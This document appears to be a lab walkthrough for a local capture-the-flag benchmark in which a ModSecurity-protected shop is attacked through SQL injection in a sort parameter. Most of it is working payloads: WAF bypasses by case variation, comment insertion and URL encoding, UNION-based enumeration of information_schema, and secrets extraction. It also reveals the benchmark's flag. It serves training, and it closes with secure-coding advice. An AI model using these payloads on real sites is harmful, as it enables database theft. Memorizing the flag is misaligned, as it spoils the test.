# S7BEN-HARD-001: Comprehensive Testing and Exploitation Guide

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Environment Setup](#environment-setup)
3. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4. [Phase 2: WAF Detection and Fingerprinting](#phase-2-waf-detection-and-fingerprinting)
5. [Phase 3: Bypass Technique Development](#phase-3-bypass-technique-development)
6. [Phase 4: Database Enumeration](#phase-4-database-enumeration)
7. [Phase 5: Flag Extraction](#phase-5-flag-extraction)
8. [Understanding the Vulnerability](#understanding-the-vulnerability)
9. [Understanding ModSecurity WAF](#understanding-modsecurity-waf)
10. [Real-World Examples](#real-world-examples)
11. [Cleanup](#cleanup)
12. [Troubleshooting](#troubleshooting)

---

## Prerequisites

### Required Tools

- **Docker & Docker Compose** (v20+)
- **curl** (command-line HTTP client)
- **jq** (JSON processor, optional but recommended)
- **Python 3.x** (for automated exploit)

### Optional Tools

- **Burp Suite** (for manual testing and WAF analysis)
- **sqlmap** (automated SQL injection tool, for comparison)
- **netcat** (for network debugging)

### Installation

```bash
# Install jq (Ubuntu/Debian)
sudo apt-get install jq

# Install jq (macOS)
brew install jq

# Verify Docker
docker --version
docker compose version
```

---

## Environment Setup

### Step 1: Start the Benchmark

```bash
cd benchmarks/S7BEN-HARD-001
make up
```

**Expected Output:**
```
[+] Building Docker images...
[+] Starting services...
✓ Services started successfully!

  URL: http://localhost
  Telemetry: http://localhost/api/telemetry
  Verify: http://localhost/api/verify

[+] Running health checks...
  ✓ Nginx health check passed
  ✓ Homepage accessible
  ✓ Products endpoint working
  ✓ Telemetry endpoint working

Ready for exploitation!
```

### Step 2: Verify Services Are Running

```bash
docker compose ps
```

**Expected Output:**
```
NAME                IMAGE                       STATUS
hard01-flask        sben-hard-01-flask-app      Up (healthy)
hard01-mysql        mysql:8.0                   Up (healthy)
hard01-nginx        sben-hard-01-nginx-modsec   Up (healthy)
```

### Step 3: Test Basic Connectivity

```bash
curl -s http://localhost/ | head -20
```

You should see the HTML homepage of SecureShop.

---

## Phase 1: Reconnaissance

### Step 1.1: Explore the Application

**Visit the homepage:**
```bash
curl -s http://localhost/ | grep -i "title\|h1\|h2"
```

**Expected Output:**
```html
<title>SecureShop - E-Commerce Platform</title>
<h1>🛒 SecureShop</h1>
<h2>Welcome to SecureShop</h2>
<h2>Product Catalog</h2>
```

### Step 1.2: Discover the Products Endpoint

**Test normal product listing:**
```bash
curl -s "http://localhost/products?sort=name" | jq
```

**Expected Output:**
```json
{
  "success": true,
  "products": [
    {
      "id": 1,
      "name": "Bookshelf",
      "category": "Furniture",
      "price": "129.99",
      "description": "5-tier wooden bookshelf",
      "stock": 15
    },
    ...
  ],
  "count": 10
}
```

### Step 1.3: Test Different Sort Parameters

```bash
# Sort by name (ascending alphabetical)
curl -s "http://localhost/products?sort=name" | jq '.products[0].name'

# Sort by price
curl -s "http://localhost/products?sort=price" | jq '.products[0].price'

# Sort by category
curl -s "http://localhost/products?sort=category" | jq '.products[0].category'
```

**Key Observation:** The `sort` parameter directly controls the ORDER BY clause in SQL.

---

## Phase 2: WAF Detection and Fingerprinting

### Step 2.1: Test Basic SQL Injection

**Attempt simple SQLi payload:**
```bash
curl -v "http://localhost/products?sort=name; OR 1=1--" 2>&1 | grep -E "HTTP|403"
```

**Expected Output:**
```
< HTTP/1.1 403 Forbidden
```

**Analysis:** The WAF blocked the request! Standard SQLi payload detected.

### Step 2.2: Fingerprint the WAF

**Check error response:**
```bash
curl -s "http://localhost/products?sort=name' OR '1'='1" -o /dev/null -w "HTTP Status: %{http_code}\n"
```

**Expected Output:**
```
HTTP Status: 403
```

**Check response headers:**
```bash
curl -I "http://localhost/products?sort=name' OR 1=1--"
```

Look for headers that might indicate ModSecurity:
- `Server: nginx` (using nginx as reverse proxy)
- No explicit "ModSecurity" header (normal behavior)

### Step 2.3: Identify Blocked Patterns

**Test various SQL keywords:**
```bash
# Test UNION
curl -s "http://localhost/products?sort=name UNION SELECT 1" -w "\nStatus: %{http_code}\n"

# Test SELECT
curl -s "http://localhost/products?sort=(SELECT 1)" -w "\nStatus: %{http_code}\n"

# Test OR
curl -s "http://localhost/products?sort=name OR 1=1" -w "\nStatus: %{http_code}\n"

# Test comment syntax
curl -s "http://localhost/products?sort=name--" -w "\nStatus: %{http_code}\n"
```

**Expected:** All return 403 (blocked by WAF)

### Step 2.4: Check Telemetry

```bash
curl -s http://localhost/api/telemetry | jq
```

**Expected Output:**
```json
{
  "benchmark_id": "S7BEN-HARD-001",
  "start_time": 1705234567.89,
  "request_count": 15,
  "waf_blocks": 0,
  "sql_attempts": 5,
  "bypass_technique": null,
  "endpoints_accessed": ["/", "/products"],
  "flag_captured": false,
  "elapsed_seconds": 45.23,
  "timestamp": "2026-01-14T12:34:56.789012"
}
```

**Note:** `waf_blocks` is tracked on the client side (count of 403 responses).

---

## Phase 3: Bypass Technique Development

### Step 3.1: Case Variation Bypass

**Technique:** Mix uppercase and lowercase to evade regex patterns.

```bash
# Try mixed case OR
curl -s "http://localhost/products?sort=name; oR 1=1--" | jq '.success'
```

**If this works (returns true):**
```bash
curl -s "http://localhost/products?sort=name; oR 1=1--" | jq '.products | length'
```

**Try more variations:**
```bash
# Different case combinations
curl -s "http://localhost/products?sort=name; Or 1=1--"
curl -s "http://localhost/products?sort=name; OR 1=1--"  # Original (should be blocked)
curl -s "http://localhost/products?sort=name; oR 1=1--"
```

### Step 3.2: Comment Injection Bypass

**Technique:** Use SQL comments to break up keywords.

```bash
# Insert comments between characters
curl -s "http://localhost/products?sort=name; OR/**/1=1--" | jq '.success'

# Try different comment styles
curl -s "http://localhost/products?sort=name; OR/*comment*/1=1--"
curl -s "http://localhost/products?sort=name; OR/**/1/**/=/**/1--"
```

### Step 3.3: URL Encoding Bypass

**Technique:** Encode SQL keywords to bypass string matching.

```bash
# URL encode "OR" as %4f%52
curl -s "http://localhost/products?sort=name; %4f%52 1=1--" | jq '.success'

# Encode "UNION"
# U=55, N=4e, I=49, O=4f, N=4e (hex)
curl -s "http://localhost/products?sort=name %55%4e%49%4f%4e SELECT 1--"
```

### Step 3.4: Double Encoding

**Technique:** Double-encode to bypass normalization.

```bash
# Double encode "OR"
# O = %4f → %254f
# R = %52 → %2552
curl -s "http://localhost/products?sort=name; %254f%2552 1=1--"
```

### Step 3.5: Test Which Bypass Works

**Create a test script:**
```bash
#!/bin/bash

echo "Testing bypass techniques..."

techniques=(
    "name; oR 1=1--:Case Variation"
    "name; OR/**/1=1--:Comment Injection"
    "name; %4f%52 1=1--:URL Encoding"
    "name/**/oR/**/1=1--:Mixed Techniques"
)

for tech in "${techniques[@]}"; do
    payload="${tech%%:*}"
    name="${tech##*:}"

    status=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost/products?sort=$payload")

    if [ "$status" -eq 200 ]; then
        echo "✓ $name: SUCCESS (200)"
    else
        echo "✗ $name: BLOCKED ($status)"
    fi
done
```

**Run it:**
```bash
chmod +x test_bypasses.sh
./test_bypasses.sh
```

---

## Phase 4: Database Enumeration

**Assumption:** You found a working bypass (let's use case variation: `oR`)

### Step 4.1: Test UNION SELECT Injection

**Determine number of columns:**
```bash
# Try UNION with different column counts
curl -s "http://localhost/products?sort=name UNION SELECT 1,2,3,4,5,6,7--" | jq '.success'
```

**Expected:** Error or success. The products table has 7 columns (id, name, category, price, description, stock, created_at).

**Use case variation for bypass:**
```bash
curl -s "http://localhost/products?sort=name uNiOn sElEcT 1,2,3,4,5,6,7--" | jq
```

### Step 4.2: Enumerate Database Name

```bash
curl -s "http://localhost/products?sort=name uNiOn sElEcT 1,database(),3,4,5,6,7--" | jq '.products[] | select(.name | type == "string" and . != null)'
```

**Expected Output:** Should show "ecommerce" as the database name.

### Step 4.3: Enumerate Tables

```bash
# List all tables in current database
curl -s "http://localhost/products?sort=name uNiOn sElEcT 1,table_name,3,4,5,6,7 fRoM information_schema.tables wHeRe table_schema=database()--" | jq '.products[].name'
```

**Expected Output:**
```
products
secrets
```

**Key Finding:** There's a `secrets` table!

### Step 4.4: Enumerate Columns in Secrets Table

```bash
curl -s "http://localhost/products?sort=name uNiOn sElEcT 1,column_name,3,4,5,6,7 fRoM information_schema.columns wHeRe table_name='secrets'--" | jq '.products[].name'
```

**Expected Output:**
```
id
key_name
secret_value
description
created_at
```

---

## Phase 5: Flag Extraction

### Step 5.1: Extract Data from Secrets Table

```bash
curl -s "http://localhost/products?sort=name uNiOn sElEcT 1,key_name,secret_value,4,5,6,7 fRoM secrets--" | jq '.products[]'
```

**Expected Output:**
```json
{
  "id": 1,
  "name": "flag",
  "category": "S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}",
  "price": "4.00",
  ...
}
```

**Flag Found:** `S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}`

### Step 5.2: Verify Exploitation

```bash
curl -s http://localhost/api/verify | jq
```

**Expected Output:**
```json
{
  "exploited": true,
  "flag": "S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}",
  "bypass_technique": "case_variation",
  "sql_attempts": 23
}
```

### Step 5.3: Check Final Telemetry

```bash
curl -s http://localhost/api/telemetry | jq
```

**Expected Output:**
```json
{
  "benchmark_id": "S7BEN-HARD-001",
  "request_count": 47,
  "waf_blocks": 0,
  "sql_attempts": 23,
  "bypass_technique": "case_variation",
  "flag_captured": true,
  "elapsed_seconds": 180.45
}
```

---

## Understanding the Vulnerability

### What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers can insert malicious SQL code into queries, allowing them to:
- Read sensitive data
- Modify database content
- Execute administrative operations
- Bypass authentication

### Why is ORDER BY Vulnerable?

The ORDER BY clause in SQL determines the sorting of query results. Unlike WHERE clauses, ORDER BY cannot easily use parameterized queries because it requires column names (identifiers), not values.

**Vulnerable code:**
```python
sort_by = request.args.get('sort', 'name')
query = f"SELECT * FROM products ORDER BY {sort_by}"
```

**Why this is dangerous:**
1. User input (`sort_by`) is directly concatenated
2. No validation or sanitization
3. Allows arbitrary SQL injection

**Example exploitation:**
```sql
-- Normal query
SELECT * FROM products ORDER BY name

-- Injected query
SELECT * FROM products ORDER BY name; DROP TABLE products--

-- UNION injection
SELECT * FROM products ORDER BY name UNION SELECT * FROM secrets--
```

### Secure Implementation

**Bad (Current):**
```python
query = f"SELECT * FROM products ORDER BY {sort_by}"
```

**Better (Whitelist):**
```python
allowed_columns = ['name', 'price', 'category']
if sort_by not in allowed_columns:
    sort_by = 'name'
query = f"SELECT * FROM products ORDER BY {sort_by}"
```

**Best (Parameterized + Whitelist):**
```python
allowed_columns = {'name': 'name', 'price': 'price', 'category': 'category'}
column = allowed_columns.get(sort_by, 'name')
query = "SELECT * FROM products ORDER BY " + column  # Safe identifier
```

---

## Understanding ModSecurity WAF

### What is ModSecurity?

ModSecurity is an open-source Web Application Firewall (WAF) that provides:
- HTTP traffic monitoring
- Real-time attack detection
- Request/response filtering
- Rule-based blocking

### OWASP Core Rule Set (CRS)

The OWASP CRS is a set of generic attack detection rules for ModSecurity, covering:
- SQL Injection
- Cross-Site Scripting (XSS)
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Remote Code Execution (RCE)
- And more...

**Paranoia Levels:**
1. **Level 1:** Basic protection (low false positives)
2. **Level 2:** Balanced (default, moderate false positives)
3. **Level 3:** Advanced (higher false positives)
4. **Level 4:** Maximum (many false positives)

This benchmark uses **Paranoia Level 2**.

### How ModSecurity Detects SQLi

**Detection Methods:**
1. **Pattern Matching:** Regex patterns for SQL keywords (UNION, SELECT, OR, AND, etc.)
2. **Anomaly Scoring:** Each suspicious pattern increases a score; threshold triggers block
3. **Keyword Detection:** Common SQL syntax elements
4. **Encoding Detection:** Multiple encoding layers

**Example CRS Rules (Simplified):**
```
SecRule ARGS "@rx (?i)(union.*select)" \
    "id:942100,phase:2,block,msg:'SQL Injection Attack'"

SecRule ARGS "@rx (?i)(;.*drop|;.*update|;.*delete)" \
    "id:942110,phase:2,block,msg:'SQL Injection Attack'"
```

### WAF Bypass Techniques

#### 1. Case Variation
**Why it works:** Regex patterns may be case-sensitive or miss mixed-case variations.

```sql
-- Blocked
UNION SELECT

-- May bypass
UnIoN SeLeCt
uNiOn sElEcT
```

#### 2. Comment Injection
**Why it works:** SQL allows comments between keywords, breaking pattern matching.

```sql
-- Blocked
UNION SELECT

-- May bypass
UNION/**/SELECT
UNION/*comment*/SELECT
UN/**/ION/**/SEL/**/ECT
```

#### 3. Encoding
**Why it works:** WAF may not decode all encoding layers before checking.

```sql
-- Blocked
UNION SELECT

-- May bypass (URL encoded)
%55%4e%49%4f%4e %53%45%4c%45%43%54

-- May bypass (double encoded)
%2555%254e%2549%254f%254e
```

#### 4. Alternative Syntax
**Why it works:** SQL has multiple ways to achieve the same result.

```sql
-- Blocked
' OR 1=1--

-- May bypass
' || '1'='1
' OR 'a'='a
```

### Limitations of WAF Protection

**WAFs are not perfect:**
1. **Bypass techniques exist** (as demonstrated)
2. **False positives** can block legitimate traffic
3. **Performance overhead** in traffic inspection
4. **Cannot fix vulnerable code** (only mitigates)

**Defense-in-Depth Principle:**
- WAF is ONE layer
- Must also use: secure coding, input validation, parameterized queries, least privilege, etc.

---

## Real-World Examples

### Case Study 1: Equifax Breach (2017)

**Vulnerability:** Apache Struts CVE-2017-5638
**WAF Status:** Equifax had a WAF, but it was not properly configured
**Impact:** 147 million records compromised

**Lesson:** WAF alone is insufficient; patching and secure development are critical.

### Case Study 2: Capital One Breach (2019)

**Vulnerability:** SSRF leading to AWS credential theft
**WAF Status:** Had WAF, but did not block SSRF payloads
**Impact:** 100 million+ records exposed

**Lesson:** WAFs cannot protect against all attack vectors.

### ModSecurity Bypass in the Wild

**Common bypass techniques seen by red teams:**
1. Case variation (still effective in 2024-2026)
2. Comment injection (effective against some WAF rules)
3. Encoding (varies by WAF normalization settings)
4. HTTP parameter pollution (multiple parameters with same name)

**Example Real Bypass (Simplified):**
```bash
# Normal payload (blocked)
?id=1' UNION SELECT password FROM users--

# Bypass using case + comments
?id=1' uNiOn/**/sElEcT/**/password/**/fRoM/**/users--
```

---

## Cleanup

### Stop Services

```bash
make down
```

### Remove All Data

```bash
make clean
```

This will:
- Stop all containers
- Remove volumes
- Delete Docker images

### Reset Telemetry Only

```bash
curl -X POST http://localhost/reset
```

---

## Troubleshooting

### Issue 1: Services Won't Start

**Symptoms:**
```
Error: Container hard01-nginx is unhealthy
```

**Solution:**
```bash
# Check logs
make logs

# Try clean rebuild
make clean
make up
```

### Issue 2: All Requests Return 403

**Symptoms:**
```
< HTTP/1.1 403 Forbidden
```

**Solutions:**

**Check if WAF is too aggressive:**
```bash
# View ModSecurity logs
docker compose exec nginx-modsec tail -f /var/log/modsec_audit.log
```

**Verify paranoia level:**
```bash
docker compose exec nginx-modsec env | grep PARANOIA
```

**Test with bypass techniques** (as shown in Phase 3)

### Issue 3: Database Connection Errors

**Symptoms:**
```json
{
  "error": "Can't connect to MySQL server"
}
```

**Solution:**
```bash
# Check MySQL health
docker compose ps mysql-db

# View MySQL logs
make logs-mysql

# Restart services
make down
make up
```

### Issue 4: WAF Not Blocking Anything

**Symptoms:**
Standard SQLi payloads return 200 OK

**Possible Causes:**
1. ModSecurity disabled
2. Wrong nginx configuration
3. CRS not loaded

**Solution:**
```bash
# Verify ModSecurity is enabled
docker compose exec nginx-modsec cat /etc/nginx/nginx.conf | grep modsecurity

# Check CRS is loaded
docker compose exec nginx-modsec ls /etc/nginx/modsecurity.d/
```

### Issue 5: Exploit Script Fails

**Symptoms:**
```
python3 exploit.py
Error: Connection refused
```

**Solution:**
```bash
# Verify services are up
make test

# Check if port 80 is accessible
curl http://localhost/health

# Try manual exploitation first (as shown in Phase 3-5)
```

---

## Advanced Challenges

### Challenge 1: Minimize Requests

**Goal:** Capture the flag in the fewest requests possible.

**Current baseline:** ~20 requests
**Can you do it in under 10?**

### Challenge 2: Stealth Mode

**Goal:** Capture the flag without triggering any WAF blocks (0 × 403 responses).

**Strategy:** Use only bypass techniques that work on first try.

### Challenge 3: Automate Everything

**Goal:** Write a fully automated script that:
1. Detects the WAF
2. Tests bypass techniques
3. Enumerates the database
4. Extracts the flag

### Challenge 4: Alternative Bypass

**Goal:** Find a bypass technique NOT mentioned in this guide.

**Ideas:**
- HTTP Parameter Pollution
- Header injection
- Alternative encoding schemes

---

## References

### ModSecurity & OWASP CRS
- [ModSecurity GitHub](https://github.com/SpiderLabs/ModSecurity)
- [OWASP CRS Documentation](https://coreruleset.org/docs/)
- [CRS Rules Explained](https://coreruleset.org/docs/rules/)

### SQL Injection
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLi Bypass WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

### Web Application Security
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Web Application Firewall Guide](https://owasp.org/www-community/Web_Application_Firewall)

---

**Happy Hacking!**

Remember: Always practice ethical hacking. Only test systems you have explicit permission to test.

---

**Created:** 2026-01-14
**Author:** Strike7 Security Team
**Benchmark:** S7BEN-HARD-001
**Phase:** 5
